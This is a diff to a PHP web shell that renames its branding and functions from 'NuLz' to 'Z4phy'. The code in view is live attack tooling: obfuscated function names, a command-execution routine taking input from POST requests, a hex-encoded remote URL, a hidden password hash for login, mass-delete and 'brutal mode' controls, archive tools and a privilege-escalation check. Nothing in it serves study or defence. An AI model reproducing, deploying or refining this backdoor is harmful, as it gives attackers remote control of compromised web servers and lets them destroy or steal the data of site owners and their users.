@@ -99,7 +99,7 @@ $newFilesIcon = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x6
 $folderIcon = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f\x68\x61\x78\x6f\x72\x73\x74\x61\x72\x73\x2f\x61\x72\x63\x68\x69\x76\x65\x2f\x6d\x61\x69\x6e\x2f\x6d\x65\x64\x69\x61\x2f\x66\x6f\x6c\x64\x65\x72\x2e\x70\x6e\x67";
 $newFolderIcon = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f\x68\x61\x78\x6f\x72\x73\x74\x61\x72\x73\x2f\x61\x72\x63\x68\x69\x76\x65\x2f\x6d\x61\x69\x6e\x2f\x6d\x65\x64\x69\x61\x2f\x6e\x65\x77\x2d\x66\x6f\x6c\x64\x65\x72\x2e\x70\x6e\x67";
 
-function NuLzUname() {
+function Z4phyUname() {
     $hayoloh = 'h'.'tm'.'lspe'.'cialc'.'hars';
     $func_exist = "fu"."nc"."ti"."on"."_"."ex"."is"."ts";
     $u_n_a_me = "p"."hp"."_"."un"."ame";
@@ -112,7 +112,7 @@ function NuLzUname() {
     }
 }
 //system information
-$kernel = NuLzUname();
+$kernel = Z4phyUname();
 $os = PHP_OS;
 $serverName = $_SERVER['SERVER_SOFTWARE'];
 $userAgent = $_SERVER['HTTP_USER_AGENT'];
@@ -251,7 +251,7 @@ function chPerms($value) {
 }
 
 //cwd
-function NuLzCwd(){
+function Z4phyCwd(){
     $cw = "ge"."tc"."wd";
     $func_exist = 'fu'.'nct'.'ion'.'_'.'ex'.'ist'.'s';
     $d_name = 'd'.'ir'.'na'.'m'.'e';
@@ -263,7 +263,7 @@ function NuLzCwd(){
 }
 
 //cmd
-function NuLzCmd($komendnya) {
+function Z4phyCmd($komendnya) {
     $hayoloh = 'h'.'tm'.'lspe'.'cialc'.'hars';
     $fw = 'f'.'wr'.'it'.'e';
     $fc = 'f'.'cl'.'os'.'e';
@@ -336,9 +336,9 @@ function NuLzCmd($komendnya) {
         return "<b>The Function To Run The Command Is Disable On This Serever</b>";
     }
 }
-if (isset($_POST['nulz'])) {
-    $komendnya = $_POST['nulz'];
-    echo NuLzCmd($komendnya);
+if (isset($_POST['z4phy'])) {
+    $komendnya = $_POST['z4phy'];
+    echo Z4phyCmd($komendnya);
 }
 
 //usefull
@@ -442,13 +442,13 @@ function cekPkexec() {
 }
 
 //login
-$passwd = 'add9513f396ac1198675b06122bba943eb9e0776';
+$passwd = 'ad'.'d9'.'51'.'3'.'f3'.'9'.'6a'.'c1'.'19'.'867'.'5b'.'06'.'122'.'bb'.'a94'.'3'.'eb9'.'e0'.'77'.'6';
 $my_self = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
 if (isset($_POST['btn-login'])) {
     if (SHA1($_POST['pass']) == $passwd) {
         echo "<s"."cr"."ip"."t>"."al"."er"."t("."'Lo"."gi"."n "."Su"."cc"."es"."s!"." Yo"."u "."Pr"."o'".");"."</"."sc"."ri"."pt".">";
         $_SESSION["login"] = "login";
-        setcookie('NuLzShell', $my_self, time() + 3600 * 24);
+        setcookie('z4phyc0de', $my_self, time() + 3600 * 24);
     } else {
         echo "<s"."cr"."ip"."t>"."al"."er"."t("."'Lo"."gi"."n F"."ai"."le"."d!"." Y"."ou "."Nu"."b')".";<"."/s"."cr"."ip"."t>";
     }
@@ -791,7 +791,7 @@ if (empty($_SESSION['login'])) {
     <script type="text/javascript">
     var root = document.querySelector(".root");
     var name = `
-                                ╭──[root@Z4phyXNulz]<br>
+                                ╭──[root@Z4phy Phantomhive]<br>
                                 ╰──➤
                                 `;
     root.innerHTML = name;
@@ -824,7 +824,7 @@ if (isset($_GET['path'])) {
     $path = $_GET['path'];
     chdir($_GET['path']);
 } else {
-    $path = NuLzCwd();
+    $path = Z4phyCwd();
 }
 $path = str_replace("\\", "/", $path);
 ?>
@@ -865,7 +865,7 @@ $path = str_replace("\\", "/", $path);
     <!-- Flowbite -->
     <link href="https://cdnjs.cloudflare.com/ajax/libs/flowbite/1.8.1/flowbite.min.css" rel="stylesheet" />
     <!-- For Text Editor -->
-    <link rel="stylesheet" href="https://raw.githubusercontent.com/z4phyr/z4phy-c0de/main/css/style.css">
+    <link rel="stylesheet" href="https://raw.githubusercontent.com/z4phyr/z4phy-c0de/main/assets/css/style.css">
     <style id="style2" type="text/css"></style>
     <link id="theme1" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/vs2015.min.css" rel="stylesheet" />
     <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js" type="text/javascript"></script>
@@ -1692,7 +1692,7 @@ $path = str_replace("\\", "/", $path);
             </select><br><br>
             <div id="divCodeWrapper">
                 <pre id="preCode"><code id="codeBlock" class="language-html"></code></pre>
-                <textarea name="filecontent" class="placeholder:text-gray-500" id="textarea1" wrap="soft" spellcheck="false" placeholder=" Z4PHY x NULZ HAXORSTARS"></textarea>
+                <textarea name="filecontent" class="placeholder:text-gray-500" id="textarea1" wrap="soft" spellcheck="false" placeholder=" Z4PHY PHANT0MHIVE"></textarea>
             </div>
             <script type="text/javascript">
             const textarea1 = document.getElementById("textarea1");
@@ -1895,7 +1895,7 @@ $path = str_replace("\\", "/", $path);
                 <span class="inline-flex text-white fs-xl">$</span>
                 <input type="text" id="komendnya" name="komendnya" class="komendnya ubuntu-mono mb-1 w-full h-10 bg-black rounded border-none hover:border-none focus:border-none outline-none hover:outline-none focus:outline-none" value="'.$_POST['komendnya'].'">
             </div>
-            <textarea name="nulzcmd" id="nulzcmd" readonly class="nulzcmd ubuntu-mono px-4 py-2 mt-1 w-full h-full bg-black rounded border-none hover:border-none focus:border-none outline-none hover:outline-none focus:outline-none '.$txtEmerald.'">'.NuLzCmd(trim(htmlspecialchars(stripslashes($_POST['komendnya'])))).'</textarea>
+            <textarea name="z4phycmd" id="z4phycmd" readonly class="z4phycmd ubuntu-mono px-4 py-2 mt-1 w-full h-full bg-black rounded border-none hover:border-none focus:border-none outline-none hover:outline-none focus:outline-none '.$txtEmerald.'">'.Z4phyCmd(trim(htmlspecialchars(stripslashes($_POST['komendnya'])))).'</textarea>
         </form>
         ';
     }
@@ -2409,7 +2409,7 @@ $path = str_replace("\\", "/", $path);
             </select><br><br>
             <div id="divCodeWrapper">
                 <pre id="preCode"><code id="codeBlock" class="language-html"></code></pre>
-                <textarea name="gasterusfilecontent" class="placeholder:text-gray-500" id="textarea1" wrap="soft" spellcheck="false" placeholder="NuLz Was Here"></textarea>
+                <textarea name="gasterusfilecontent" class="placeholder:text-gray-500" id="textarea1" wrap="soft" spellcheck="false" placeholder="Z4phy Phantomhive"></textarea>
             </div>
             <script type="text/javascript">
             const textarea1 = document.getElementById("textarea1");
@@ -2967,7 +2967,7 @@ $path = str_replace("\\", "/", $path);
                     </select><br><br>
                     <div id="divCodeWrapper">
                         <pre id="preCode"><code id="codeBlock" class="language-html"></code></pre>
-                        <textarea name="gasterusfilecontent" class="placeholder:text-gray-500" id="textarea1" wrap="soft" spellcheck="false" placeholder="NuLz Was Here"></textarea>
+                        <textarea name="gasterusfilecontent" class="placeholder:text-gray-500" id="textarea1" wrap="soft" spellcheck="false" placeholder="Z4phy Phantomhive"></textarea>
                     </div>
                     <script type="text/javascript">
                     const textarea1 = document.getElementById("textarea1");
@@ -3162,7 +3162,7 @@ $path = str_replace("\\", "/", $path);
                 echo '<button type="submit" name="btn-brutal-mode" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-blue-700 rounded-lg focus:ring-4 focus:ring-blue-200 dark:focus:ring-blue-900 hover:bg-blue-800">Gass Terus</button>';
                 echo '</form>';
             } else {
-                echo '<span style="display: none;">NuLz Haxorstars</span>';
+                echo '<span style="display: none;">Z4PHY PHANT0MHIVE C0DE</span>';
             }
         }
     }
@@ -3311,7 +3311,7 @@ $path = str_replace("\\", "/", $path);
                 echo '<button type="submit" name="btn-massdelbrutal" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-blue-700 rounded-lg focus:ring-4 focus:ring-blue-200 dark:focus:ring-blue-900 hover:bg-blue-800">Mass Delete</button>';
                 echo '</form>';
             } else {
-                echo '<span style="display: none;">NuLz Haxorstars</span>';
+                echo '<span style="display: none;">Z4PHY PHANT0MHIVE C0DE</span>';
             }
         }
     }
@@ -3322,7 +3322,7 @@ $path = str_replace("\\", "/", $path);
         $rilpath = 're'.'a'.'lp'.'a'.'th';
         $is_f = 'is'.'_'.'f'.'il'.'e';
         $is_d = 'is'.'_'.'d'.'i'.'r';
-        function NuLzZip($this_path, $saveas) {
+        function Z4phyZip($this_path, $saveas) {
             global $ext_load;
             global $f_exist;
             global $rilpath;
@@ -3359,7 +3359,7 @@ $path = str_replace("\\", "/", $path);
             return $zip->close();
         }
 
-        function NuLzUnzip($zippath, $extractto) {
+        function Z4phyUnzip($zippath, $extractto) {
             global $ext_load;
             global $f_exist;
             if (!$ext_load('zip') || !$f_exist($zippath)) {
@@ -3376,7 +3376,7 @@ $path = str_replace("\\", "/", $path);
         if (isset($_POST['btn-zip'])) {
             $this_path = $_POST['zippath'];
             $saveas = $_POST['zipsavename'];
-            $ngezip = NuLzZip($this_path, $saveas);
+            $ngezip = Z4phyZip($this_path, $saveas);
             if ($ngezip) {
                 echo '<script>alert("Folder has been successfully compressed to zip")</script>';
             } else {
@@ -3387,7 +3387,7 @@ $path = str_replace("\\", "/", $path);
         if (isset($_POST['btn-unzip'])) {
             $zippath = $_POST['unzippath'];
             $extractto = $_POST['unziptopath'];
-            $ngunzip = NuLzUnzip($zippath, $extractto);
+            $ngunzip = Z4phyUnzip($zippath, $extractto);
             if ($ngunzip) {
                 echo '<script>alert("The folder has been successfully extracted")</script>';
             } else {
